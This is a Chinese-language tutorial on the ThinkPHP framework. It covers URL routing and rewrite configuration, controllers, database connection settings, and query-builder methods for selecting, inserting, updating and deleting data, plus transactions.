控制台入口文件除了应用入口文件外，系统还提供了一个控制台入口文件（即位于项目根目录的think文件）
控制台入口文件用于执行控制台指令，例如：
php think version

系统内置了一些常用的控制台指令，如果你安装了额外的扩展，也会增加相应的控制台指令，都是通过该入口文件执行的。
多应用模式详见官方手册
URL访问单应用URLhttp://serverName/index.php/控制器/操作/参数/值…


注意：这里服务器启动是 php think run 的内置服务器，下节课会探讨外置服务器；

结构分析：

serverName就是我们的：127.0.0.1:8000；

index.php 是入口文件，带上 / ；

控制器是app\controller\Index.php中的 Index 这个名称，也就是类名；

操作是类里面的方法名，比如：index（默认方法），hello（普通方法）；

默认方法可以省略，会直接方法，其他普通方法需要键入方法名：

http://127.0.0.1:8000/index.php/Index (默认执行index操作)
http://127.0.0.1:8000/index.php/Index/index (完整路径)
http://127.0.0.1:8000/index.php/Index/test (普通方法，必须完整路径)


系统默认自带的hello方法，是针对后续路由的，在路由文件设置过导致无效；

我们在config&#x2F;app.php中将路由关闭：&quot;with_route&quot;  =&gt; false,

http://127.0.0.1:8000/index.php/Index/hello （执行默认参数值）
http://127.0.0.1:8000/index.php/Index/hello/name/World（修改参数值）


参数不够直观，尤其多参数的时候，也是支持传统方案的：

http://127.0.0.1:8000/index.php/Index/hello?name=World （问号键值对）





URL重写可以通过URL重写隐藏应用的入口文件index.php（也可以是其它的入口文件，但URL重写通常只能设置一个入口文件）,下面是相关服务器的配置参考：
[ Apache ]
httpd.conf配置文件中加载了mod_rewrite.so模块
AllowOverride None 将None改为 All
把下面的内容保存为.htaccess文件放到应用入口文件的同级目录下

&lt;IfModule mod_rewrite.c&gt;  Options +FollowSymlinks -Multiviews  RewriteEngine On  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f  RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]&lt;/IfModule&gt;

[ Nginx ]在Nginx低版本中，是不支持PATHINFO的，但是可以通过在Nginx.conf中配置转发规则实现：
location / &#123; // …..省略部分代码   if (!-f $request_filename) &#123;   		rewrite  ^(.*)$  /index.php?s=/$1  last;    &#125;&#125;

其实内部是转发到了ThinkPHP提供的兼容URL，利用这种方式，可以解决其他不支持PATHINFO的WEB服务器环境。
外置服务器，比如phpEnv，省略了入口文件，则出现如下问题：

查看手册，根据它URL重写的修改方案（Apache），需要修改.htaccess最后一行：
#RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]  Apache替换成下面一行RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]

控制器定义
控制器：顾名思义MVC中的C，即逻辑控制定义；

默认在app\controller下编写对应的控制器类文件，如果想改默认目录，在&#x2F;config&#x2F;route.php中进行修改：
// 访问控制器层名称&quot;controller_layer&quot;      =&gt; &quot;controller&quot;,

类名和文件名大小写保持一致，并采用驼峰式（首字母大写）；
&lt;?phpnamespace app\controller;class User&#123;    public function index()&#123;        return &quot;用户！&quot;;    &#125;    public function login($name = &#x27;city&#x27;)&#123;        return &quot;登陆成功！&quot;.$name;    &#125;&#125;



User类创建两个方法 index(默认)和 login，访问 URL 如下：
http://127.0.0.1:8000/index.php/user/
http://127.0.0.1:8000/index.php/user/login
http://127.0.0.1:8000/index.php/User/login?name = Mancity


那么如果创建的是双字母组合，比如 class HelloWorld，访问 URL 如下：

http://127.0.0.1:8000/Index.php/helloworld

http://127.0.0.1:8000/Index.php/Hello_World
&lt;?phpnamespace app\controller;class HelloWorld&#123;    public function index()&#123;        return &quot;Hello world!&quot;;    &#125;&#125;

基础和空控制器基础控制器
一般来说，创建控制器后，推荐继承基础控制器来获得更多的功能方法；

基础控制器仅仅提供了控制器验证功能，并注入了think\App和think\Request；
namespace app\controller;use app\BaseController;class User extends BaseController&#123;    public function index()    &#123;        // 返回实际路径        return $this-&gt;app-&gt;getBasePath();        // 返回当前方法名        return $this-&gt;request-&gt;action();    &#125;&#125;

空控制器
空控制器一般用于载入不存在的控制器时，进行错误提示；
class Error&#123;    public function __call(string $name, array $arguments)    &#123;        return &quot;当前控制器不存在！&quot;;    &#125;&#125;

数据库创建数据库及表我这边使用navicat软件配合phpstudy进行创建的，这边我就不详细说明了
连接数据库和查询连接数据库
我们可以在 config\database.php 配置文件中设置与数据库的连接信息：

如果是一般性数据库连接，在 ‘’connections‘’ 配置区设置即可；

如果是本地测试，它会优先读取 .env 配置，然后再读取 database.php 的配置；
# .env文件，部署服务器，请禁用我APP_DEBUG = trueDB_TYPE = mysqlDB_HOST = 127.0.0.1DB_NAME = demoDB_USER = rootDB_PASS = 123456DB_PORT = 3306DB_CHARSET = utf8DEFAULT_LANG = zh-cn

如果禁用了 .env 配置，则会读取数据库连接的默认配置：
// 数据库连接配置信息&quot;connections&quot;     =&gt; [    &quot;mysql&quot; =&gt; [        // 数据库类型        &quot;type&quot;            =&gt; env(&quot;DB_TYPE&quot;, &quot;mysql&quot;),        // 服务器地址        &quot;hostname&quot;        =&gt; env(&quot;DB_HOST&quot;, &quot;127.0.0.1&quot;),        // 数据库名        &quot;database&quot;        =&gt; env(&quot;DB_NAME&quot;, &quot;demo&quot;),        // 用户名        &quot;username&quot;        =&gt; env(&quot;DB_USER&quot;, &quot;root&quot;),        // 密码        &quot;password&quot;        =&gt; env(&quot;DB_PASS&quot;, &quot;123456&quot;),        // 端口        &quot;hostport&quot;        =&gt; env(&quot;DB_PORT&quot;, &quot;3306&quot;),



PHP获取数据
我们暂时没有详细学习此类语法，可以简单用一些了解一下即可：
// 引入Db数据库类use think\facade\Db;class User extends BaseController&#123;    public function get()    &#123;        // 连接user表，查询        $user = Db::table(&quot;users&quot;)-&gt;select();        // 输出数据        return json($user);    &#125;&#125;

数据查询table方法
Db类旗下有一个 table 静态调用的方法，参数为完整的表名（前缀都不能省略）；

如果希望只查询一条数据，可以使用 find() 方法，需指定 where 条件：
// 通过ID查询指定的数据// find 方法查询结果不存在，返回 null，否则返回结果数组$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 1)-&gt;find();

想要了解执行的原生SQL是什么，可以注释掉 return 直接通过 trace 查看；

使用 findOrEmpty() 方法也可以查询一条数据，但在没有数据时返回一个空数组：
// 没有数据返回空数组$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 11)-&gt;findOrEmpty();

使用 findOrFail() 方法同样可以查询一条数据，在没有数据时抛出一个异常：
// 没有数据抛出异常$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 11)-&gt;findOrFail();

想要获取多列数据，可以使用 select() 方法：
// 查询所有数据$user = Db::table(&quot;user&quot;)-&gt;select();

select() 方法默认返回 Collection 对象的数据集，可以通过 toArray() 方法转换成数组：
// 用中断函数，来检测返回值$user = Db::table(&quot;user&quot;)-&gt;select();halt($user);// 转换成数组$user = Db::table(&quot;user&quot;)-&gt;select()-&gt;toArray();halt($user);

多列数据也可以参与 where() 方法的筛选：
// 多列筛选$user = Db::table(&quot;user&quot;)-&gt;where(&quot;age&quot;, 14)-&gt;select();

链式查询
我们发现通过指向符号 “-&gt;” 多次连续调用方法称为：链式查询；
当 Db::table(“user”) 时，返回查询对象（Query），即可连缀数据库对应的方法；
当返回查询对象（Query）时，就可以继续调用链式方法，where() 也是链式方法；
而 where() 被调用后，依旧返回（Query），可以再次链式调用；
在手册 数据库 -&gt; 查询构造器 -&gt; 链式操作 可以了解所有可链式的方法：table、where等；
直到遇到 find() 或 select() 返回数组或数据集时，结束查询；

表达式查询
查询表达式支持大部分常用的 SQL 语句，语法格式如下：
where(&quot;字段名&quot;,&quot;查询表达式&quot;,&quot;查询条件&quot;);

所有的表达式，查阅手册 -&gt; 查询表达式 中的表格即可；这里列出几个意思一下：



表达式
含义
快捷方式



&#x3D;
等于



&lt;&#x3D; time
小于等于某个时间
whereTime


EXP
SQL表达式查询
whereExp


[NOT] LIKE
模糊查询
whereLike


[NOT] IN
[非] IN 查询
whereIN




查询示例
条件判断类的，id大于4的；
// 查询id大于4的数据$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 4)-&gt;select();return json($user);

Like模糊查询，姓王的；
// 查询姓王的用户$user = Db::name(&quot;user&quot;)-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;王%&quot;)-&gt;select();// like快捷方式$user = Db::name(&quot;user&quot;)-&gt;whereLike(&quot;name&quot;, &quot;王%&quot;)-&gt;select();

IN区间查询，根据id；
// 区间查询，支持not in$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;in&quot;, &quot;1, 3, 5&quot;)-&gt;select();// 语义更好一点$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;in&quot;, [1,3,5])-&gt;select();// IN快捷查询，两种均可，支持whereNotIn$user = Db::name(&quot;user&quot;)-&gt;whereIn(&quot;id&quot;, [1, 2, 3])-&gt;select();// Between，和IN一样 支持 not between$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;between&quot;, [2,5])-&gt;select();// 快捷方式和IN一样：whereBetween和whereNotBetween

NULL查询；
// NULL,  null 或 not null：$user = Db::name(&quot;user&quot;)-&gt;where(&quot;details&quot;, &quot;not null&quot;)-&gt;select();// 快捷方式：whereNull和whereNotNull

EXP查询，自定义SQL片段；
// EXP查询，自定义SQL$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;EXP&quot;, &quot;&lt;&gt; 8 and id &gt;5&quot;)-&gt;select();// 快捷查询$user = Db::name(&quot;user&quot;)-&gt;whereExp(&quot;id&quot;,&quot;&lt;&gt; 8 and id &gt;5&quot;)-&gt;select();

表前缀之扩展查询表前缀
一般来说，为了保持表名统一性和防止冲突，都会给表加上一个前缀，以下划线结束；

比如：tp_user，这里的 tp_ 就是表前缀，所有；

我们修改MySQL中表名，然后刷新程序，报错；

当然，你可以传递 **Db::table(“tp_user”)**，但没必要；



首先，我们可以来配置统一前缀：

在 .env 文件中 添加：DB_PREFIX = tp_

如果部署环境 database.php 中 设置
&quot;prefix&quot; =&gt; env(&quot;DB_PREFIX&quot;, &quot;tp_&quot;),


然后，使用 Db::name(“user”) 方法即可：
// 此时，tp_ 表名的前缀可以省略$user = Db::name(&quot;user&quot;)-&gt;select();

扩展查询
通过 value() 方法，可以查询指定字段的值（单个），没有数据返回 null ；
// value() 方法查询单个列值$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 3)-&gt;value(&quot;name&quot;);

通过 colunm() 方法，可以查询指定列的值（多个），没有数据返回空数组；
// colunm() 方法查询多个列值$user = Db::name(&quot;user&quot;)-&gt;column(&quot;name&quot;);// 通过id 作为索引$user = Db::name(&quot;user&quot;)-&gt;column(&quot;name,age&quot;, &quot;id&quot;);

当大量数据需要 批处理 时，比如给所有用户更新数据，就不能一次性全取出来，一批一批的来；
// 批量处理Db::name(&quot;user&quot;)-&gt;chunk(2, function ($users) &#123;    foreach ($users as $user) &#123;        dump($user);    &#125;    echo 1;&#125;);// 通过获取最后的SQL语句，发现用的是LIMIT 2return Db::getLastSql();

另一种处理大量数据：游标查询，为了解决内存开销，每次读取一行，并返回到下一行再读取；
// 批量处理2$users = Db::name(&quot;user&quot;)-&gt;cursor();// PHP生成器// halt($user);foreach ($users as $user) &#123;    dump($user);&#125;

添加数据单条新增
使用 insert() 方法可以向数据表添加一条数据，更多的字段采用默认；
public function add()&#123;    // 数据$data = [    &quot;name&quot;    =&gt; &quot;张麻子&quot;,    &quot;age&quot;     =&gt; 28,    &quot;gender&quot;  =&gt; &quot;男&quot;];// 单条新增，成功返回1return Db::name(&quot;user&quot;)-&gt;insert($data);&#125;

如果想强行新增抛弃不存在的字段数据，则使用 strick(false) 方法，忽略异常；
// 数据$data = [    &quot;name&quot;    =&gt; &quot;马邦德&quot;,    &quot;age&quot;     =&gt; 30,    &quot;gender&quot;  =&gt; &quot;男&quot;,    &quot;deta&quot; =&gt; &quot;我脸上没有麻子！&quot;];// 单条新增，成功返回1return Db::name(&quot;user&quot;)-&gt;strict(false)-&gt;insert($data);

如果我们采用的数据库是 mysql，可以支持 replace 写入；

insert 和 replace insert 写入的区别，前者表示表中存在主键相同则报错，后者则修改；
// 新增数据时，主键冲突时，直接修改这条记录Db::name(&quot;user&quot;)-&gt;replace()-&gt;insert($data);

使用 insertGetId() 方法，可以在新增成功后返回当前数据 ID；
// 返回自增IDreturn Db::name(&quot;user&quot;)-&gt;replace()-&gt;insertGetId($data);

多条新增
使用 insertAll() 方法，可以批量新增数据，但要保持数组结构一致；
// 数据$data = [[    &quot;name&quot;    =&gt; &quot;林克&quot;,    &quot;age&quot;     =&gt; 19,    &quot;gender&quot;  =&gt; &quot;男&quot;,    &quot;details&quot; =&gt; &quot;先收集999个呀哈哈！&quot;],[    &quot;name&quot;    =&gt; &quot;普尔亚&quot;,    &quot;age&quot;     =&gt; 100,    &quot;gender&quot;  =&gt; &quot;女&quot;,    &quot;details&quot; =&gt; &quot;我先来个返老还童，再快速长大！&quot;]];return Db::name(&quot;user&quot;)-&gt;insertAll($data);

insertAll() 方法 也支持 replace 写入，如果添加数据量大，可以通过 -&gt; limit() 方法限制添加数量；
Db::name(&quot;user&quot;)-&gt;replace()-&gt;limit(100)-&gt;insertAll($data);

更新，删除以及save方法数据修改
使用 update() 方法来修改数据，修改成功返回影响行数，没有修改返回 0；
// 修改的数据$data = [    &quot;name&quot; =&gt; &quot;王三狗&quot;,    &quot;age&quot;  =&gt; &quot;13&quot;,];// 执行修改并返回return Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 4)-&gt;update($data);

如果修改数据包含了主键信息，比如 id，那么可以省略掉 where 条件；
// 修改的数据$data = [    &quot;id&quot;   =&gt; 4,    &quot;name&quot; =&gt; &quot;王三狗&quot;,    &quot;age&quot;  =&gt; &quot;13&quot;,];// 执行修改并返回return Db::name(&quot;user&quot;)-&gt;update($data);

如果想让一些字段修改时执行 SQL 函数操作，可以使用 exp() 方法实现；
// 让details字段内的英文大写return Db::name(&quot;user&quot;)-&gt;exp(&quot;details&quot;, &quot;UPPER(details)&quot;)-&gt;update($data);

如果要自增&#x2F;自减某个字段，可以使用 inc&#x2F;dec 方法，并支持自定义步长；
// 修改时，让age自增和自减，默认1，要去掉$data里面age字段的修改，不然冲突return Db::name(&quot;user&quot;)-&gt;inc(&quot;age&quot;)-&gt;dec(&quot;age&quot;, 2)-&gt;update($data);// 派生自字段，延迟执行，毫秒setInc(&quot;age&quot;, 1, 600)setDec(&quot;age&quot;, 2, 600)

使用 Db::raw() 来设置每个字段的特殊需求，灵活且清晰：
// 使用Db::raw 更加清晰灵活Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 4)-&gt;update([    &quot;details&quot;   =&gt;  Db::raw(&quot;UPPER(details)&quot;),    &quot;age&quot;       =&gt;  Db::raw(&quot;age-2&quot;)]);return Db::getLastSql();

save() 方法是一个通用方法，可以自行判断是新增还是修改(更新)数据；
// 包含主键，即修改；否则，新增return Db::name(&quot;user&quot;)-&gt;save($data);

数据删除
极简删除可以根据主键直接删除，删除成功返回影响行数，否则 0；
// 根据主键删除Db::name(&quot;user&quot;)-&gt;delete(8);

根据主键，还可以删除多条记录；
// 根据主键删除多条Db::name(&quot;user&quot;)-&gt;delete([48,49,50]);

正常情况下，通过 where()方法来删除；
// 条件删除Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 47)-&gt;delete();

其他各种查询方式字符串条件
whereRaw 可以直接写入多条件：
// 多条件字符串$user = Db::name(&quot;user&quot;)-&gt;whereRaw(&quot;age &gt; 15 AND gender=&quot;女&quot;&quot;)-&gt;select();

包含变量的多条件查询：
// 变量$age = 15;$gender = &quot;女&quot;;// 预处理机制$user = Db::name(&quot;user&quot;)-&gt;whereRaw(&quot;age&gt;:age AND gender=:gender&quot;, [    &quot;age&quot;       =&gt; $age,    &quot;gender&quot;    =&gt; $gender])-&gt;select();

field()字段筛选
使用 field() 方法，可以指定要查询的字段；
// 字段筛选$user = Db::name(&quot;user&quot;)-&gt;field(&quot;id, age, gender&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field([&quot;id, age, gender&quot;])-&gt;select();

使用 field() 方法，给指定的字段设置别名；
// 字段别名$user = Db::name(&quot;user&quot;)-&gt;field(&quot;id, gender as sex&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field([&quot;id&quot;, &quot;gender&quot;=&gt;&quot;sex&quot;])-&gt;select();

在 fieldRaw() 方法里，可以直接给字段设置 MySQL 函数；
// 直接SQL函数$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;id, UPPER(details)&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field(true)-&gt;select();   // 推荐return Db::getLastSql();

使用 withoutField() 方法中字段排除，可以屏蔽掉想要不显示的字段；
// 排除字段$user = Db::name(&quot;user&quot;)-&gt;withoutField(&quot;details&quot;)-&gt;select();

使用 field() 方法在新增时，验证字段的合法性；
// 排除新增字段Db::name(&quot;user&quot;)-&gt;field(&quot;name,age,gender&quot;)-&gt;insert($data);

常用链式方法
使用 alias() 方法，给数据库起一个别名；
// 给数据库起个别名Db::name(&quot;user&quot;)-&gt;alias(&quot;a&quot;)-&gt;select();return Db::getLastSql();// 起别名最主要是和另一张表进行关联，这里看手册好了，没表测试alias(&quot;a&quot;)-&gt;join()

使用 limit() 方法，限制获取输出数据的个数；
// 显示前5条$user = Db::name(&quot;user&quot;)-&gt;limit(5)-&gt;select();

分页模式，即传递两个参数，比如从第 3 条开始显示 5 条 limit(2,5)；
// 从第2个位置，也就是第3条开始，显示5条$user = Db::name(&quot;user&quot;)-&gt;limit(2,5)-&gt;select();// 查询第一页数据，1至10条$user = Db::name(&quot;user&quot;)-&gt;page(1,10)-&gt;select(); 

使用 order() 方法，可以指定排序方式，没有指定第二参数，默认 asc；
// 按id倒序排列$user = Db::name(&quot;user&quot;)-&gt;order(&quot;id&quot;, &quot;desc&quot;)-&gt;select();

支持数组的方式，对多个字段进行排序；
// 按多个字段规则排序$user = Db::name(&quot;user&quot;)-&gt;order([&quot;age&quot;=&gt;&quot;asc&quot;, &quot;id&quot;=&gt;&quot;desc&quot;])-&gt;select();//支持 orderRaw() 方法，可以传入SQL函数，和前面各类Raw一样，不再赘述

使用 group() 方法，给性别不同的人进行 age 字段的总和统计；
// 统计性别的年龄总和$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;gender, SUM(age)&quot;)                        -&gt;group(&quot;gender&quot;)-&gt;select();

使用 group() 分组之后，再使用 having() 进行筛选；
// 统计性别的年龄总和，筛选大于100的$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;gender, SUM(age)&quot;)                        -&gt;group(&quot;gender&quot;)                        -&gt;having(&quot;SUM(age) &gt; 100&quot;)-&gt;select();

时间查询
可以使用 &gt;、&lt;、&gt;&#x3D;、&lt;&#x3D; 来筛选匹配时间的数据；
// 传统时间筛选$user = Db::name(&quot;user&quot;)-&gt;where(&quot;create_time&quot;, &quot;&gt;&quot;, &quot;2022-1-1&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;where(&quot;create_time&quot;, &quot;between&quot;, [&quot;2020-1-1&quot;, &quot;2023-1-1&quot;])-&gt;select(); 

快捷方式 whereTime：
// 使用快捷方式查询$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;&gt;=&quot;, &quot;2022-1-1&quot;)-&gt;select();// 默认是 &gt; 可以省略$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;2022-1-1&quot;)-&gt;select();

区间查询快捷方式 whereBetweenTime：
// 区间查询，包含 whereNotBetweenTime$user = Db::name(&quot;user&quot;)-&gt;whereBetweenTime(&quot;create_time&quot;, &quot;2020-1-1&quot;, &quot;2023-1-1&quot;)-&gt;select();

使用 whereYear 查询今年的数据、去年的数据和某一年的数据；
// 查询今年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;)-&gt;select();// 查询去年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;, &quot;last year&quot;)-&gt;select();// 查询某一年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;, &quot;2019&quot;)-&gt;select();

使用 whereMonth 查询当月的数据、上月的数据和某一个月的数据；
Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;, &quot;last month&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;, &quot;2020-6&quot;)-&gt;select();

使用 whereDay 查询今天的数据、昨天的数据和某一个天的数据；
Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;, &quot;last day&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;, &quot;2020-6-27&quot;)-&gt;select();

查询指定时间的数据，比如两小时内的；
// 两小时内的$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;-2 hours&quot;)-&gt;select();

查询两个时间字段时间有效期的数据，比如活动开始到结束的期间；

比如创建两个字段：start_time，end_time，注册后，分别写入对应时间表明它的有效期；
// 直接这么写，不太好理解，看手册的另一种普通写法很容易理解// 实战中，字段丰富的时候再演示$user = Db::name(&quot;user&quot;)-&gt;whereBetweenTimeField(&quot;start_time&quot;, &quot;end_time&quot;)-&gt;select();

聚合查询
使用 count() 方法，可以求出所查询数据的数量；
// 获取记录数$user = Db::name(&quot;user&quot;)-&gt;count();

count() 可设置指定 id，比如有空值(Null)的 details，不会计算数量；
// 值NULL不计数$user = Db::name(&quot;user&quot;)-&gt;count(&quot;details&quot;);

使用 max() 方法，求出所查询数据字段的最大值；
// 求最大年龄$user = Db::name(&quot;user&quot;)-&gt;max(&quot;age&quot;);

如果 max() 方法，求出的值不是数值，则通过第二参数强制转换；
// 如果最大值不是数值，false关闭强制转换$user = Db::name(&quot;user&quot;)-&gt;max(&quot;name&quot;, false);

使用 min() 方法，求出所查询数据字段的最小值，也可以强制转换；
// 求最小值$user = Db::name(&quot;user&quot;)-&gt;min(&quot;age&quot;);

使用 avg() 方法，求出所查询数据字段的平均值；
// 求平均值$user = Db::name(&quot;user&quot;)-&gt;avg(&quot;age&quot;);

使用 sum() 方法，求出所查询数据字段的总和；
// 求总和$user = Db::name(&quot;user&quot;)-&gt;sum(&quot;age&quot;);

子查询
使用 fetchSql() 方法，传递参数true时，可以设置不执行 SQL，直接返回SQL语句；
// 子查询语句$user = Db::name(&quot;user&quot;)-&gt;fetchSql(true)-&gt;select();

使用 buildSql() 方法，也是返回 SQL 语句，不需要再执行 select()，且有括号；
// 第二种子查询$subQuery = Db::name(&quot;user&quot;)-&gt;buildSql(true);

结合以上方法，我们实现一个子查询；
// 子查询样式$subQuery = Db::name(&quot;user&quot;)-&gt;field(&quot;id&quot;)-&gt;where(&quot;age&quot;,&quot;&gt;&quot;, 18)-&gt;buildSql();$user = Db::name(&quot;user&quot;)-&gt;whereExp(&quot;id&quot;, &quot;IN &quot;.$subQuery)-&gt;select();

使用闭包的方式执行子查询；
// 采用闭包构建子查询$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;IN&quot;, function ($query) &#123;    $query-&gt;name(&quot;user&quot;)-&gt;field(&quot;id&quot;)-&gt;where(&quot;age&quot;,&quot;&gt;&quot;, 18);&#125;)-&gt;select();

原生查询
使用 query() 方法，进行原生 SQL 查询，适用于读取操作，SQL 错误返回 false；
// 原生SQL$user = Db::query(&quot;SELECT * FROM tp_user&quot;);

使用 execute 方法，进行原生 SQL 更新写入等，SQL 错误返回 false；
// 原生更新写入$user = Db::execute(&quot;update tp_user set details=&quot;快快快来救我！&quot; where id=5&quot;);

列字段快捷查询
之前用过诸如：whereIn、whereExp、whereLike等等快捷查询；

所有快捷查询列表的手册位置：数据库 -&gt; 查询构造器 -&gt; 高级查询中，找到快捷查询表格；

whereColumn() 方法，比较两个字段的值，符合的就筛选出来；
// 字段比较，id大于age$user = Db::name(&quot;user&quot;)-&gt;whereColumn(&quot;id&quot;, &quot;&gt;&quot;, &quot;age&quot;)-&gt;select();// 如果是 等于判断 可以简化-&gt;whereColumn(&quot;id&quot;, &quot;age&quot;)

whereFieldName() 方法，查询某个字段的值，注意 FileName 是字段名；
// 获取所有性别为：男$user = Db::name(&quot;user&quot;)-&gt;whereGender(&quot;男&quot;)-&gt;select();// 获取名字叫王二狗的信息$user = Db::name(&quot;user&quot;)-&gt;whereName(&quot;王二狗&quot;)-&gt;find();

getByFieldName() 方法，查询某个字段的值，注意只能查询一条，不需要 **find()**；
// 单条数据$user = Db::name(&quot;user&quot;)-&gt;getByName(&quot;王二狗&quot;);

getFieldByFieldName() 方法，通过查询得到某个指定字段的单一值；
// 查询单条并返回单列，找出王二狗的年龄$user = Db::name(&quot;user&quot;)-&gt;getFieldByName(&quot;王二狗&quot;, &quot;age&quot;);

条件查询
when() 可以通过条件判断，执行闭包里的分支查询；
// 条件判断$user = Db::name(&quot;user&quot;)-&gt;when(false, function ($query) &#123;    // 满足条件执行这段SQL    $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 5);&#125;, function ($query) &#123;    // 不满足条件执行这段SQL    $query-&gt;where(&quot;id&quot;, &quot;&lt;=&quot;, 5);&#125;)-&gt;select();

第一个参数 false 是条件，如果该条件为 true，则执行第一个匿名函数，否则执行第二个匿名函数。
事务
数据库的表引擎需要是 InnoDB 才可以使用，如果不是调整即可；

事务处理，需要执行多个 SQL 查询，数据是关联恒定的；

如果成功一条查询，改变了数据，而后一条失败，则前面的数据回滚；

比如：银行取钱，银行ATM扣了1000，但入口被卡住，你没拿到，这时需要事务处理；

系统提供了两种事务处理的方式，第一种是自动处理，出错自动回滚；
// 出现异常回滚Db::transaction(function () &#123;    Db::name(&quot;user&quot;)-&gt;delete(12);    Db::name(&quot;user&quot;)-&gt;findOrFail(13);&#125;);

手动处理，基本和原生处理类似，可以自行输出错误信息；
// 启动事务Db::startTrans();try &#123;    Db::name(&quot;user&quot;)-&gt;delete(12);    Db::name(&quot;user&quot;)-&gt;findOrFail(13);    //提交事务    Db::commit();&#125; catch (\Exception $e) &#123;    echo &quot;执行SQL失败！&quot;;    // 回滚    Db::rollback();&#125;

获取器
获取器的意思就是：将数据的字段进行转换处理再进行操作；

比如在获取数据列表的时候，将获取到的详情字段全部大写；
// 获取器改变字段值$user = Db::name(&quot;user&quot;)-&gt;withAttr(&quot;details&quot;, function ($value, $data) &#123;    // NULL 不处理    if ($value != null) &#123;        return strtoupper($value);    &#125;&#125;)-&gt;select();

withAttr也是支持JSON字段的，具体参考手册 查询构造器 -&gt; 获取器；


高级查询索引关联
where 方法的数组查询：
// 性别男，年龄大于15岁，常规做法$user = Db::name(&quot;user&quot;)-&gt;where(&quot;age&quot;, &quot;&gt;&quot;, 15)                        -&gt;where(&quot;gender&quot;, &quot;男&quot;)-&gt;select();// 索引数组方式，二维数组，返回的SQL 是一条 AND 并列关系$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;],    [&quot;gender&quot;,&quot;=&quot;, &quot;男&quot;]])-&gt;select();// 如果是等于，可以直接用关联数组，一维$user = Db::name(&quot;user&quot;)-&gt;where([    &quot;age&quot;     =&gt;  15,    &quot;gender&quot;  =&gt;  &quot;男&quot;])-&gt;select();// 两种模式结合起来，$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;],    &quot;gender&quot;  =&gt;  &quot;男&quot;])-&gt;select();// 搜索条件独立管理，这里=号写全$map[] = [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;];$map[] = [&quot;gender&quot;,&quot;=&quot;, &quot;男&quot;];$user = Db::name(&quot;user&quot;)-&gt;where($map)-&gt;select();

拼装查询
使用 |(OR) 或 &amp;(AND) 来实现 where 条件的高级查询，where 支持多个连缀；
// or和and 拼装查询$user = Db::name(&quot;user&quot;)-&gt;where(&quot;name|details&quot;, &quot;like&quot;, &quot;%王%&quot;)						-&gt;where(&quot;id&amp;create_time&quot;, &quot;&gt;&quot;, 0)    					-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE &quot;%王%&quot; OR `details` LIKE &quot;%王%&quot; ) AND ( `id` &gt; 0 AND `create_time` &gt; &quot;0&quot; )

索引数组方式，可以在 where 进行多个字段进行查询；
// 索引数组拼装$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;id&quot;, &quot;&gt;&quot;, &quot;5&quot;],    [&quot;gender&quot;, &quot;=&quot;, &quot;女&quot;],    [&quot;age&quot;, &quot;&lt;=&quot;, 15],    [&quot;details&quot;, &quot;like&quot;, &quot;%我%&quot;]])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE `id` &gt; 5 AND `gender` = &quot;女&quot; AND `age` &lt;= 15 AND `details` LIKE &quot;%我%&quot;

条件字符串复杂组装，比如使用 exp 了，就使用 raw() 方法；
// exp 拼装$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE `gender` = &quot;男&quot; AND ( `age` &gt;=10 AND id&lt;5 )

如果有多个where，并需要控制优先级，那么可以在需要的部分加上中括号；
